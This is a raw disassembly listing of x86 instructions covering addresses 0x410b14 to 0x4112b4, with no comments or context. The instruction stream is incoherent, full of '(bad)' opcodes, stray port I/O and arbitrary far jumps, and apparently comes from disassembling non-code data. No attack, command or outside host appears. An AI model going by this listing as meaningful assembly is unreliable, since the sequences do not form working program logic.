  410b14:	repz mov cs,ebp
  410b17:	dec    esi
  410b18:	inc    edi
  410b19:	and    DWORD PTR [ebx+0x98934e6],ebp
  410b1f:	jecxz  0x410b9f
  410b21:	ins    BYTE PTR es:[edi],dx
  410b22:	popa   
  410b23:	jmp    0xebb5976e
  410b28:	mov    WORD PTR ds:0x9604716d,ds
  410b2e:	cwde   
  410b2f:	pop    edx
  410b30:	add    BYTE PTR [ebp-0x5c],dh
  410b33:	call   0xe65c0fa6
  410b38:	sbb    bl,BYTE PTR [edx+0x39]
  410b3b:	cld    
  410b3c:	ins    BYTE PTR es:[edi],dx
  410b3d:	dec    ebp
  410b3e:	arpl   WORD PTR [edx],bp
  410b40:	jmp    0x14d4:0x2ba0ab9b
  410b47:	xchg   BYTE PTR [ebx+0xbc0ed03],ah
  410b4d:	push   ebx
  410b4e:	sti    
  410b4f:	out    0x42,al
  410b51:	mov    dl,bh
  410b53:	pop    esp
  410b54:	fisttp WORD PTR [eax+0x2e]
  410b57:	xor    al,0x23
  410b59:	pop    ss
  410b5a:	sbb    DWORD PTR [edi-0x4a],0xc34b4a25
  410b61:	leave  
  410b62:	inc    ecx
  410b63:	mov    ah,0x57
  410b65:	and    al,0xf7
  410b67:	mov    al,0x6c
  410b69:	mov    ch,0x1
  410b6b:	out    dx,al
  410b6c:	push   0xbc15d47b
  410b71:	or     dl,BYTE PTR [ebx+0x39]
  410b74:	and    BYTE PTR [edx+0x21],bh
  410b77:	or     DWORD PTR [eax+0x3],ebx
  410b7a:	mov    ebx,DWORD PTR [eax+0x5e04e76d]
  410b80:	push   ebp
  410b81:	jle    0x410bf5
  410b83:	sbb    al,0x5b
  410b85:	jo     0x410bc4
  410b87:	jecxz  0x410b49
  410b89:	mov    ch,ah
  410b8b:	push   edi
  410b8c:	mov    esp,0x2bae7488
  410b91:	cs jp  0x410b24
  410b94:	rol    DWORD PTR [ebx+esi*2],0xeb
  410b98:	cmp    eax,0xbecb4ad7
  410b9d:	push   ds
  410b9e:	dec    edi
  410b9f:	leave  
  410ba0:	pop    edi
  410ba1:	and    DWORD PTR [ecx+0x5d],ebx
  410ba4:	xchg   DWORD PTR [ecx],edx
  410ba6:	fidiv  DWORD PTR [ecx+ecx*1]
  410ba9:	xor    al,0xbd
  410bab:	sub    eax,0xbd7504be
  410bb0:	mov    cl,BYTE PTR [edx]
  410bb2:	inc    esp
  410bb3:	mov    dl,0x8c
  410bb5:	sar    DWORD PTR [eax+0x11],0xcf
  410bb9:	imul   eax,DWORD PTR [edx+0x33ed5978],0xffffff97
  410bc0:	(bad)  
  410bc1:	pop    edx
  410bc2:	fsub   DWORD PTR [eax]
  410bc4:	mov    edi,0x528d571e
  410bc9:	stc    
  410bca:	stos   BYTE PTR es:[edi],al
  410bcb:	mov    cl,dl
  410bcd:	and    al,0xce
  410bcf:	aad    0xaf
  410bd1:	inc    edx
  410bd2:	sub    DWORD PTR [ecx],esi
  410bd4:	adc    eax,0xe5e30d99
  410bd9:	xor    DWORD PTR ds:0xb806a4bf,ecx
  410bdf:	push   esi
  410be0:	ins    BYTE PTR es:[edi],dx
  410be1:	cmp    DWORD PTR [esi-0xa985fc7],edx
  410be7:	add    eax,0xf450ea74
  410bec:	jle    0x410c1e
  410bee:	nop
  410bef:	das    
  410bf0:	mov    ah,0x51
  410bf2:	mov    ebp,0xd1d0501d
  410bf7:	leave  
  410bf8:	pusha  
  410bf9:	cmc    
  410bfa:	sar    DWORD PTR [esi-0x34],1
  410bfd:	aaa    
  410bfe:	leave  
  410bff:	xor    eax,0x5713581a
  410c04:	jae    0x410bbe
  410c06:	jo     0x410bbc
  410c08:	jecxz  0x410bf4
  410c0a:	imul   edx,DWORD PTR [ecx+esi*1+0x59],0x7f
  410c0f:	ret    0xb107
  410c12:	es push ecx
  410c14:	or     al,0xf0
  410c16:	mov    ds:0xce019a0d,eax
  410c1b:	loop   0x410bdc
  410c1d:	mov    WORD PTR [eax],fs
  410c1f:	fld    QWORD PTR [ebx-0x195b9413]
  410c25:	pop    eax
  410c26:	nop
  410c27:	mov    edx,0x8ad6eb20
  410c2c:	int    0x74
  410c2e:	inc    eax
  410c2f:	sti    
  410c30:	xchg   ebx,eax
  410c31:	rcl    ecx,cl
  410c33:	add    DWORD PTR [ebp+0xdb8bb4],ebx
  410c39:	(bad)  
  410c3a:	cmp    al,BYTE PTR [ebp-0x5f]
  410c3d:	mov    edx,0x3110e2e9
  410c42:	dec    esi
  410c43:	and    al,0xc0
  410c45:	mov    edx,esi
  410c47:	sbb    ebx,ecx
  410c49:	pop    ss
  410c4a:	mov    DWORD PTR [edx],edi
  410c4c:	loope  0x410c9d
  410c4e:	xor    dl,bh
  410c50:	lds    edi,FWORD PTR [ecx-0x7e]
  410c53:	stos   DWORD PTR es:[edi],eax
  410c54:	xchg   ebx,eax
  410c55:	repz mov cl,BYTE PTR ds:0x448aaf4a
  410c5c:	cmp    DWORD PTR [ecx+0x1b],ecx
  410c5f:	inc    esp
  410c60:	ins    BYTE PTR es:[edi],dx
  410c61:	sub    esp,ebp
  410c63:	inc    ecx
  410c64:	fadd   DWORD PTR [esi+0x53]
  410c67:	or     eax,0x627ee1a9
  410c6c:	cmp    eax,DWORD PTR [edx]
  410c6e:	imul   edi,DWORD PTR [ebp+0x7939aaeb],0xabbd8a7b
  410c78:	icebp  
  410c79:	adc    ah,BYTE PTR [ebx-0x31]
  410c7c:	adc    eax,0x4309ef8e
  410c81:	icebp  
  410c82:	fisub  DWORD PTR ss:[ebp+0x66]
  410c86:	lods   al,BYTE PTR ds:[esi]
  410c87:	popf   
  410c88:	jl     0x410cac
  410c8a:	rol    BYTE PTR [eax+0x1175d864],1
  410c90:	lds    esp,FWORD PTR [edi]
  410c92:	sbb    eax,0x71639d4f
  410c97:	mov    ebp,0x45bade6b
  410c9c:	adc    BYTE PTR [ebx],dh
  410c9e:	jle    0x410cfb
  410ca0:	pop    ebp
  410ca1:	xchg   esp,eax
  410ca2:	push   ebp
  410ca3:	sub    eax,0x20e20eea
  410ca8:	pop    esp
  410ca9:	mov    ds:0xe4bd94b6,eax
  410cae:	(bad)  
  410caf:	dec    ebx
  410cb0:	xchg   esp,eax
  410cb1:	sub    BYTE PTR [edx+eiz*4-0x50994b7c],al
  410cb8:	adc    edx,DWORD PTR [esi-0x40]
  410cbb:	or     DWORD PTR [eax],edx
  410cbd:	and    eax,0x97cfc86a
  410cc2:	and    al,0xd7
  410cc4:	rcl    DWORD PTR [ebx+ecx*1+0x2d],0xc1
  410cc9:	(bad)  
  410cca:	and    DWORD PTR [ecx-0x5c],eax
  410ccd:	mov    bl,BYTE PTR [ebx]
  410ccf:	mov    edx,DWORD PTR [ebp-0x58]
  410cd2:	inc    edi
  410cd3:	in     eax,0x77
  410cd5:	int    0x11
  410cd7:	(bad)  
  410cd8:	jne    0x410d04
  410cda:	xor    BYTE PTR [ecx+edx*2],al
  410cdd:	pop    ss
  410cde:	iret   
  410cdf:	adc    DWORD PTR [ecx+0x3f7527b8],edi
  410ce5:	out    dx,eax
  410ce6:	ss xchg esp,eax
  410ce8:	xchg   BYTE PTR [ebx+ecx*2],ch
  410ceb:	ffree  st(7)
  410ced:	jge    0x410d44
  410cef:	js     0x410cae
  410cf1:	jecxz  0x410c74
  410cf3:	jno    0x410cd1
  410cf5:	repz add esp,edi
  410cf8:	lds    ecx,FWORD PTR ds:0xd61b4b7c
  410cfe:	xor    ebx,esp
  410d00:	test   eax,0x89ecc6fb
  410d05:	icebp  
  410d06:	ins    DWORD PTR es:[edi],dx
  410d07:	aas    
  410d08:	mov    al,0x15
  410d0a:	data16 je 0x410c99
  410d0d:	xor    eax,0x8cfb5348
  410d12:	sti    
  410d13:	push   eax
  410d14:	ds ffreep st(6)
  410d17:	outs   dx,BYTE PTR ds:[esi]
  410d18:	int3   
  410d19:	adc    cl,cl
  410d1b:	je     0x410cf6
  410d1d:	add    DWORD PTR [edi],ebp
  410d1f:	int3   
  410d20:	push   ecx
  410d21:	pop    es
  410d22:	call   0x9a27aa9
  410d27:	call   0x91187f7e
  410d2c:	loope  0x410d01
  410d2e:	(bad)  
  410d2f:	jno    0x410d5c
  410d31:	mov    dh,0xcb
  410d33:	sbb    esp,esp
  410d35:	cdq    
  410d36:	out    dx,al
  410d37:	dec    esp
  410d38:	xchg   esp,eax
  410d39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d3a:	mov    dl,0xb1
  410d3c:	imul   edx,DWORD PTR [ebp+eax*1+0x31],0xffffffcf
  410d41:	sub    ah,bh
  410d43:	inc    edi
  410d44:	jecxz  0x410cde
  410d46:	loop   0x410d7c
  410d48:	adc    edx,DWORD PTR [esp+edx*2-0x70d47b2b]
  410d4f:	pop    es
  410d50:	dec    ebp
  410d51:	and    eax,0x853799e3
  410d56:	cmp    esp,DWORD PTR cs:[ecx+0x12]
  410d5a:	ja     0x410d2c
  410d5c:	add    eax,0xcc1be6aa
  410d61:	and    eax,0xcd4611c2
  410d66:	push   ebx
  410d67:	(bad)  
  410d68:	int3   
  410d69:	addr16 ret 0xa25a
  410d6d:	add    al,0x5a
  410d6f:	pop    eax
  410d70:	mov    cl,0xc6
  410d72:	dec    esp
  410d73:	cdq    
  410d74:	push   ecx
  410d75:	jecxz  0x410d24
  410d77:	fsubr  DWORD PTR [ecx-0x2d2d635]
  410d7d:	stc    
  410d7e:	shl    BYTE PTR [ebx],0x85
  410d81:	out    dx,eax
  410d82:	test   DWORD PTR [ecx+0x2e0b06a1],esi
  410d88:	dec    esi
  410d89:	ret    
  410d8a:	push   ebx
  410d8b:	popf   
  410d8c:	cs cmp cl,dl
  410d8f:	mov    edi,0xb4c5b5db
  410d94:	push   es
  410d95:	cli    
  410d96:	inc    edx
  410d97:	cmp    BYTE PTR [ebp+0x4a437770],ah
  410d9d:	loope  0x410d3b
  410d9f:	xor    al,0x1
  410da1:	sbb    edx,DWORD PTR [eax+eax*2+0x2eba9c93]
  410da8:	es pop edi
  410daa:	jno    0x410ddc
  410dac:	mov    ebp,0xe1dab551
  410db1:	hlt    
  410db2:	sar    ebx,cl
  410db4:	repnz stos DWORD PTR es:[edi],eax
  410db6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410db7:	rcr    BYTE PTR [ebx],1
  410db9:	sub    BYTE PTR [edx+0x6f],0x55
  410dbd:	loopne 0x410da2
  410dbf:	xchg   edx,eax
  410dc0:	fs add al,0xba
  410dc3:	sub    edi,DWORD PTR [eax+0x4911529]
  410dc9:	fmul   QWORD PTR [edx+0x6bab80c8]
  410dcf:	pop    esi
  410dd0:	sbb    DWORD PTR ds:0xdc91064a,ebx
  410dd6:	add    ah,BYTE PTR es:[esi]
  410dd9:	jne    0x410d87
  410ddb:	and    DWORD PTR [ebx+eiz*4],esi
  410dde:	mov    ebp,0xf5d14c3e
  410de3:	and    DWORD PTR [esi-0x61],ebp
  410de6:	sbb    ah,BYTE PTR [esi-0x49]
  410de9:	adc    BYTE PTR [ebx],bh
  410deb:	enter  0xb374,0x4a
  410def:	sub    ebp,DWORD PTR [ebx+ebx*8-0x5a]
  410df3:	cmp    al,bl
  410df5:	sbb    bl,bl
  410df7:	jo     0x410e5f
  410df9:	pop    edx
  410dfa:	(bad)  
  410dfb:	retf   0x4c25
  410dfe:	pop    eax
  410dff:	jne    0x410d97
  410e01:	pop    esi
  410e02:	rol    bh,0xa2
  410e05:	push   edx
  410e06:	pushf  
  410e07:	mov    dl,0x24
  410e09:	jne    0x410e49
  410e0b:	popa   
  410e0c:	gs aas 
  410e0e:	adc    DWORD PTR [edx+0x749d7fa5],esi
  410e14:	add    eax,0x557ff2ff
  410e19:	sub    esp,DWORD PTR [esi+0x2b62abce]
  410e1f:	cmp    BYTE PTR [ebx+0x3f020b7a],0x9d
  410e26:	xchg   esi,eax
  410e27:	jmp    0xd690af6a
  410e2c:	stc    
  410e2d:	sbb    BYTE PTR ds:0xb7e03c40,dh
  410e33:	or     al,0x42
  410e35:	pushf  
  410e36:	(bad)  
  410e37:	jge    0x410e54
  410e39:	out    dx,al
  410e3a:	inc    ebx
  410e3b:	mov    edx,0x5cc631ee
  410e40:	sub    eax,0xa3fa3a60
  410e45:	jne    0x410ec1
  410e47:	or     dh,BYTE PTR [eax-0x61]
  410e4a:	xor    DWORD PTR [ebp+0x54ee5345],ecx
  410e50:	cmc    
  410e51:	stc    
  410e52:	inc    ebp
  410e53:	loopne 0x410eb4
  410e55:	pop    ebp
  410e56:	add    eax,0x7bbb1c75
  410e5b:	in     al,dx
  410e5c:	mov    esi,eax
  410e5e:	inc    ebx
  410e5f:	in     al,0x37
  410e61:	push   es
  410e62:	add    bl,ah
  410e64:	les    edx,FWORD PTR [ebx]
  410e66:	jg     0x410e71
  410e68:	pop    edx
  410e69:	cmc    
  410e6a:	ffree  st(2)
  410e6c:	(bad)  
  410e6d:	pop    esi
  410e6e:	mov    eax,0x39b8a9c9
  410e73:	push   ds
  410e74:	mov    ebp,0xd71669ed
  410e79:	scas   al,BYTE PTR es:[edi]
  410e7a:	mov    edx,0xe1344cbc
  410e7f:	cmc    
  410e80:	lods   eax,DWORD PTR ds:[esi]
  410e81:	push   esp
  410e82:	sahf   
  410e83:	ins    DWORD PTR es:[edi],dx
  410e84:	in     eax,dx
  410e85:	mov    al,ds:0x2952b835
  410e8a:	jns    0x410f0a
  410e8c:	mov    ch,0x4
  410e8e:	shl    eax,1
  410e90:	xchg   edi,eax
  410e91:	imul   edx,edx,0x2b
  410e94:	xchg   ebp,eax
  410e95:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  410e97:	pushf  
  410e98:	cs push ecx
  410e9a:	push   esp
  410e9b:	(bad)  
  410e9c:	dec    ebp
  410e9d:	(bad)  [ecx]
  410e9f:	jg     0x410eaa
  410ea1:	sbb    ah,BYTE PTR [esi-0x375feebf]
  410ea7:	jl     0x410eb3
  410ea9:	in     eax,0x8d
  410eab:	cmc    
  410eac:	mov    DWORD PTR [eax],ecx
  410eae:	xchg   ecx,eax
  410eaf:	or     DWORD PTR [eax-0x79],ebp
  410eb2:	or     dl,ch
  410eb4:	je     0x410e5b
  410eb6:	mov    ah,0xf3
  410eb8:	adc    DWORD PTR [ebp+edi*1-0x520dc0b6],ebx
  410ebf:	lock test BYTE PTR [ebx],bh
  410ec2:	mov    dh,0x8d
  410ec4:	sbb    bl,BYTE PTR [edi+0x7d]
  410ec7:	push   ecx
  410ec8:	ins    DWORD PTR es:[edi],dx
  410ec9:	and    DWORD PTR ds:0xdc057cd7,eax
  410ecf:	dec    ebx
  410ed0:	xor    al,0x85
  410ed2:	imul   esp,DWORD PTR [edi],0x454c298d
  410ed8:	leave  
  410ed9:	dec    esp
  410eda:	jge    0x410e61
  410edc:	jle    0x410e8d
  410ede:	ror    DWORD PTR [esi+0x6b],1
  410ee1:	push   cs
  410ee2:	rcl    DWORD PTR [edi-0x922274],cl
  410ee8:	jle    0x410f0f
  410eea:	ja     0x410f38
  410eec:	xlat   BYTE PTR ds:[ebx]
  410eed:	push   ebx
  410eee:	sub    DWORD PTR [edi-0x7fb8855b],edx
  410ef4:	lock mov ds,WORD PTR [esi+0x7c]
  410ef8:	jbe    0x410e8a
  410efa:	mov    ebp,0xbb96ea30
  410eff:	pop    esi
  410f00:	mov    edi,0xd31efb48
  410f05:	fmul   DWORD PTR [eax+edx*8-0x6ed7bece]
  410f0c:	inc    ebx
  410f0d:	fs push cs
  410f0f:	add    al,0xc0
  410f11:	mov    ch,0x53
  410f13:	cmp    eax,0x4a339b25
  410f18:	xor    ah,BYTE PTR [ecx-0x38fb20c3]
  410f1e:	push   edx
  410f1f:	cld    
  410f20:	inc    edi
  410f21:	outs   dx,DWORD PTR ds:[esi]
  410f22:	test   eax,0xabee230d
  410f27:	mul    edi
  410f29:	jnp    0x410f88
  410f2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f2c:	aad    0x94
  410f2e:	lods   al,BYTE PTR ds:[esi]
  410f2f:	sub    BYTE PTR [esi+0x3],dh
  410f32:	jae    0x410fb2
  410f34:	adc    BYTE PTR [ecx-0x53],al
  410f37:	xor    cl,0xbb
  410f3a:	sub    eax,0x6535129a
  410f3f:	jae    0x410f43
  410f41:	cmc    
  410f42:	pop    edx
  410f43:	jg     0x410f52
  410f45:	inc    esp
  410f46:	clc    
  410f47:	retf   
  410f48:	cmp    BYTE PTR [esi],al
  410f4a:	shr    BYTE PTR [ebx-0x7e],cl
  410f4d:	sbb    al,0xb9
  410f4f:	xor    DWORD PTR [edx+0xb],ecx
  410f52:	push   0xffffffe4
  410f54:	sahf   
  410f55:	daa    
  410f56:	and    ebp,esi
  410f58:	push   ebx
  410f59:	jmp    0xc24:0x8c7fe045
  410f60:	mov    al,0xb1
  410f62:	adc    edx,DWORD PTR [ebp+0x4e]
  410f65:	jle    0x410ef6
  410f67:	or     DWORD PTR [ecx-0x38e23d08],ecx
  410f6d:	or     DWORD PTR [edi],0x2b1ec4f4
  410f73:	into   
  410f74:	inc    eax
  410f75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f76:	in     al,0x96
  410f78:	in     al,dx
  410f79:	jmp    0x38ca:0x59847a27
  410f80:	call   0xa703:0xbe9a460d
  410f87:	cmp    edx,DWORD PTR [ecx+ebx*2+0x4f11e6b4]
  410f8e:	pop    esp
  410f8f:	cmc    
  410f90:	scas   al,BYTE PTR es:[edi]
  410f91:	(bad)  
  410f92:	popa   
  410f93:	pop    eax
  410f94:	or     eax,0x5b815c54
  410f99:	cmp    al,0xe2
  410f9b:	adc    eax,ecx
  410f9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f9e:	push   cs
  410f9f:	mov    ecx,DWORD PTR [esi-0x11]
  410fa2:	jnp    0x410fab
  410fa4:	cli    
  410fa5:	jae    0x410f8f
  410fa7:	dec    ebp
  410fa8:	leave  
  410fa9:	add    al,al
  410fab:	pushf  
  410fac:	mov    ah,0xd1
  410fae:	adc    ch,bh
  410fb0:	fisubr WORD PTR [edx-0x7bee148d]
  410fb6:	add    dh,BYTE PTR [edi]
  410fb8:	dec    ebp
  410fb9:	xchg   ecx,eax
  410fba:	jo     0x410fb7
  410fbc:	inc    esp
  410fbd:	test   al,0x19
  410fbf:	sub    dh,BYTE PTR [eax+ebx*8-0x7b]
  410fc3:	add    DWORD PTR [ebp+0x6b],esp
  410fc6:	fistp  WORD PTR [ebx]
  410fc8:	sbb    esp,edx
  410fca:	sub    bl,BYTE PTR ds:0xd4b6bdd9
  410fd0:	out    0x27,eax
  410fd2:	(bad)
  410fd5:	add    eax,0xb01efb8f
  410fda:	shl    BYTE PTR [edx+0x27d26d69],cl
  410fe0:	or     dl,bl
  410fe2:	enter  0x5ea7,0x95
  410fe6:	popa   
  410fe7:	sbb    dh,dl
  410fe9:	rol    DWORD PTR [edx+edx*2+0x5c],cl
  410fed:	jg     0x410fc4
  410fef:	lods   al,BYTE PTR ds:[esi]
  410ff0:	jge    0x410fca
  410ff2:	pop    esi
  410ff3:	jbe    0x41106e
  410ff5:	add    esp,DWORD PTR [edi]
  410ff7:	popf   
  410ff8:	bound  ebp,QWORD PTR [edx-0x1d]
  410ffb:	popf   
  410ffc:	inc    ebx
  410ffd:	mov    dl,0xe
  411000:	push   eax
  411001:	js     0x410fb1
  411003:	call   DWORD PTR [ebx+0x43]
  411006:	jae    0x411051
  411008:	in     al,dx
  411009:	jecxz  0x41104f
  41100b:	adc    edi,DWORD PTR [eax-0x3f65104c]
  411011:	jns    0x410fc2
  411013:	sbb    esi,eax
  411015:	hlt    
  411016:	mov    esp,ds
  411018:	call   0x49b:0x8f6d4bdf
  41101f:	jmp    0x41105b
  411021:	adc    eax,0x6bb52a7e
  411026:	out    0xdf,al
  411028:	ds jb  0x410fbb
  41102b:	cmp    DWORD PTR [edx+edi*8],edi
  41102e:	mov    eax,0xe438949d
  411033:	test   DWORD PTR [ebp+esi*8+0x7eed0fa2],ecx
  41103a:	call   0x961c:0x862c5852
  411041:	pop    edi
  411042:	jmp    0x411065
  411044:	mov    cl,0x6e
  411046:	push   edx
  411047:	cmp    DWORD PTR [edi+0x48],eax
  41104a:	xchg   ecx,eax
  41104b:	adc    eax,ebx
  41104d:	bound  esp,QWORD PTR [esi]
  41104f:	out    dx,al
  411050:	cdq    
  411051:	lods   eax,DWORD PTR ds:[esi]
  411052:	adc    ecx,DWORD PTR [ebp+0x51bba2ac]
  411058:	in     eax,0xba
  41105a:	pop    edi
  41105b:	or     BYTE PTR [ecx],ah
  41105d:	xchg   edx,eax
  41105e:	or     cl,BYTE PTR [ebp+0x77a09089]
  411064:	xor    eax,0xa760242c
  411069:	in     al,dx
  41106a:	xchg   edi,eax
  41106b:	outs   dx,DWORD PTR ds:[esi]
  41106c:	fs jo  0x4110c1
  41106f:	lds    ebx,FWORD PTR [ebx-0x43385d51]
  411075:	inc    ebp
  411076:	cmp    esi,DWORD PTR [edi+ebp*2]
  411079:	xor    bh,BYTE PTR [ebx+0x7f5c27e9]
  41107f:	in     eax,dx
  411080:	cmp    bl,bl
  411082:	push   0xfe444a74
  411087:	stc    
  411088:	stos   DWORD PTR es:[edi],eax
  411089:	popa   
  41108a:	dec    ecx
  41108b:	in     eax,dx
  41108c:	jp     0x411076
  41108e:	or     al,0x55
  411090:	sbb    BYTE PTR [eax-0x44],dl
  411093:	inc    ebx
  411094:	(bad)  
  411095:	daa    
  411096:	stos   DWORD PTR es:[edi],eax
  411097:	(bad)  
  411098:	xor    bh,ah
  41109a:	arpl   WORD PTR [ebx-0x56],sp
  41109d:	push   es
  41109e:	enter  0x75c1,0xcb
  4110a2:	mov    dh,0x7f
  4110a4:	es jae 0x411102
  4110a7:	leave  
  4110a8:	(bad)  
  4110a9:	ret    
  4110aa:	int    0x24
  4110ac:	call   0xc849:0xc607191e
  4110b3:	lods   eax,DWORD PTR ds:[esi]
  4110b4:	xlat   BYTE PTR ds:[ebx]
  4110b5:	(bad)  
  4110b7:	cmp    DWORD PTR [ebx],eax
  4110b9:	pop    ecx
  4110ba:	mov    bh,bh
  4110bc:	jne    0x411056
  4110be:	adc    al,0xce
  4110c0:	or     ah,BYTE PTR [esi-0x73d6d51]
  4110c6:	data16 cs cld 
  4110c9:	and    al,0xe4
  4110cb:	imul   edx,DWORD PTR [eax-0x14],0x55
  4110cf:	(bad)  
  4110d0:	cmp    al,0x4d
  4110d2:	adc    BYTE PTR [ecx+0x34],0x11
  4110d6:	or     eax,0x4c2661ca
  4110db:	nop
  4110dc:	loop   0x411095
  4110de:	pop    edi
  4110df:	in     eax,0xb5
  4110e1:	sub    eax,DWORD PTR [ebp-0xe]
  4110e4:	push   esi
  4110e5:	pop    edx
  4110e6:	xchg   ebx,eax
  4110e7:	adc    dl,ah
  4110e9:	adc    al,0x34
  4110eb:	push   edx
  4110ec:	aaa    
  4110ed:	ret    0x2ea1
  4110f0:	adc    eax,0x9ac9cb6e
  4110f5:	js     0x41116f
  4110f7:	cmp    BYTE PTR [ebx],al
  4110f9:	repz mov edx,0x3fdb1a5d
  4110ff:	cmp    DWORD PTR [ebx+0x57],ebx
  411102:	cmp    ecx,0xfffffff5
  411105:	mov    ebp,0xef7325a1
  41110a:	iret   
  41110b:	icebp  
  41110c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41110d:	jns    0x4110f5
  41110f:	mov    ecx,0x26549c3f
  411114:	push   eax
  411115:	jp     0x4110ae
  411117:	imul   ebp,ecx,0x18111f1e
  41111d:	jmp    0x30055afc
  411122:	mov    bh,0xeb
  411124:	or     cl,bl
  411126:	rol    DWORD PTR [eax],0xce
  411129:	rcl    DWORD PTR [ebp-0x32],cl
  41112c:	fnstenv [ebx]
  41112e:	inc    ebp
  41112f:	dec    ebp
  411130:	dec    edx
  411131:	icebp  
  411132:	add    al,0x50
  411134:	ror    BYTE PTR [edi],1
  411136:	sbb    al,0xd8
  411138:	sbb    dl,al
  41113a:	out    0x6f,al
  41113c:	outs   dx,DWORD PTR ds:[esi]
  41113d:	pop    ebx
  41113e:	jnp    0x4111a3
  411140:	in     eax,0x34
  411142:	call   0xbdc4:0x64eb7f4e
  411149:	sbb    dh,BYTE PTR [eax-0xc778bf4]
  41114f:	push   esp
  411150:	add    esp,edi
  411152:	imul   esi,DWORD PTR [eax+0x79eae231],0x67b6795a
  41115c:	shl    BYTE PTR [ebx-0x6],0xd
  411160:	int    0xa7
  411162:	shr    DWORD PTR [ebx],cl
  411164:	fdivr  st(5),st
  411166:	jmp    0x4111df
  411168:	xchg   ecx,eax
  411169:	lock imul ebx,DWORD PTR [esi],0xffffffa1
  41116d:	dec    esi
  41116e:	leave  
  41116f:	inc    bp
  411171:	xchg   ebx,eax
  411172:	cmp    cl,BYTE PTR [edx+0x60e45d48]
  411178:	pushf  
  411179:	xor    al,0xa8
  41117b:	arpl   WORD PTR [esi],si
  41117d:	loopne 0x4111b2
  41117f:	sub    dh,BYTE PTR [ebx+0xf0221c]
  411185:	xchg   esp,eax
  411186:	dec    esp
  411187:	sbb    al,0x7c
  411189:	dec    eax
  41118a:	lock stos DWORD PTR es:[edi],eax
  41118c:	or     ebx,DWORD PTR [ecx]
  41118e:	outs   dx,BYTE PTR ds:[esi]
  41118f:	add    esp,DWORD PTR [eax+0x33]
  411192:	dec    ecx
  411193:	push   ecx
  411194:	adc    BYTE PTR [esi],0x10
  411197:	lock dec esp
  411199:	push   ebp
  41119a:	push   ebp
  41119b:	xchg   ecx,eax
  41119c:	cmp    DWORD PTR [ebx],edx
  41119e:	mov    eax,ds:0xc38ee42e
  4111a3:	adc    al,0x34
  4111a5:	mov    ds:0xa654dee5,eax
  4111aa:	jnp    0x41120a
  4111ac:	dec    esi
  4111ad:	mov    ebp,DWORD PTR [eax]
  4111af:	sub    ah,BYTE PTR [esi+eax*2-0x26859c40]
  4111b6:	jae    0x4111ee
  4111b8:	cwde   
  4111b9:	je     0x41120d
  4111bb:	iret   
  4111bc:	mov    al,0xf3
  4111be:	fbstp  TBYTE PTR [eax]
  4111c0:	dec    edx
  4111c1:	fs test al,0xcc
  4111c4:	popf   
  4111c5:	add    BYTE PTR [edx+0x19],dh
  4111c8:	orps   xmm7,XMMWORD PTR [eax+eiz*2+0x4a]
  4111cd:	inc    edi
  4111ce:	jge    0x411231
  4111d0:	pop    ebp
  4111d1:	ret    0x1e95
  4111d4:	mov    edi,0xa0605dbd
  4111d9:	xchg   ch,bh
  4111db:	retf   0x57df
  4111de:	push   es
  4111df:	mov    esp,ss
  4111e1:	mov    al,0xfb
  4111e3:	in     al,0x65
  4111e5:	inc    edi
  4111e6:	xor    DWORD PTR [esi],esi
  4111e8:	pop    esp
  4111e9:	loop   0x4111c7
  4111eb:	cld    
  4111ec:	lods   al,BYTE PTR ds:[esi]
  4111ed:	sub    ecx,DWORD PTR [ebx]
  4111ef:	jnp    0x4111f1
  4111f1:	test   eax,0xaf07acb9
  4111f6:	cmp    ebp,DWORD PTR [esi+0x5a]
  4111f9:	mov    dh,0xe8
  4111fb:	xor    DWORD PTR [esi+0x6eec0aac],ebp
  411201:	inc    ecx
  411202:	or     eax,0xa5af3f56
  411207:	xchg   edx,eax
  411208:	sub    eax,0xd5145126
  41120d:	in     eax,0x63
  41120f:	lahf   
  411210:	add    esp,ebp
  411212:	sbb    al,0x5d
  411214:	(bad)  
  411215:	popa   
  411216:	lahf   
  411217:	pop    esp
  411218:	inc    ecx
  411219:	push   edi
  41121a:	mov    esp,0xa64f70c0
  41121f:	mov    edx,0xc1590c8f
  411224:	mov    esp,0x70d0cec4
  411229:	jbe    0x411207
  41122b:	xchg   esi,eax
  41122c:	jl     0x4111bc
  41122e:	je     0x4112a5
  411230:	ja     0x41127f
  411232:	mov    edx,0x8f188940
  411237:	jle    0x41125c
  411239:	fstp   DWORD PTR [edx-0x64]
  41123c:	test   al,0x49
  41123e:	enter  0x651a,0x83
  411242:	push   edx
  411243:	sub    al,0xc0
  411245:	arpl   WORD PTR [ecx-0x606a82c7],sp
  41124b:	xchg   BYTE PTR [edi+0x4696425d],bh
  411251:	lods   eax,DWORD PTR ds:[esi]
  411252:	mov    DWORD PTR [ebx-0xecd7bfb],ebx
  411258:	les    esp,FWORD PTR [edi+0x5b]
  41125b:	or     ah,BYTE PTR [esi-0x36]
  41125e:	push   0xea008fe4
  411263:	jp     0x41121e
  411265:	inc    esi
  411266:	ins    BYTE PTR es:[edi],dx
  411267:	push   eax
  411268:	adc    al,bl
  41126a:	mov    ah,0x9
  41126c:	sub    dl,BYTE PTR [edx+0x4e]
  41126f:	shl    BYTE PTR [eax-0xa],0x67
  411273:	in     al,dx
  411274:	retf   0x6e02
  411277:	imul   DWORD PTR [ebx+0x5b]
  41127a:	lahf   
  41127b:	or     DWORD PTR [esi-0x156da25a],esi
  411281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411282:	retf   
  411283:	lahf   
  411284:	sub    dl,al
  411286:	retf   0xb6ea
  411289:	out    0xa4,al
  41128b:	dec    ebx
  41128c:	xor    bh,BYTE PTR [eax+0x35]
  41128f:	sub    al,0xfe
  411291:	inc    ebp
  411292:	dec    esi
  411293:	adc    ebx,DWORD PTR [ecx+0x5]
  411296:	adc    DWORD PTR [esi],edi
  411298:	(bad)  
  411299:	xchg   edx,eax
  41129a:	gs retf 
  41129c:	mov    ah,0x43
  41129e:	and    edi,DWORD PTR [ecx-0x664f87e1]
  4112a4:	or     esi,DWORD PTR ds:0xdd3b6435
  4112aa:	xor    DWORD PTR [edi],edx
  4112ac:	and    esi,edi
  4112ae:	pop    ss
  4112af:	mov    ah,0x1c
  4112b1:	clc    
  4112b2:	jns    0x41124b
  4112b4:	xchg   edx,eax
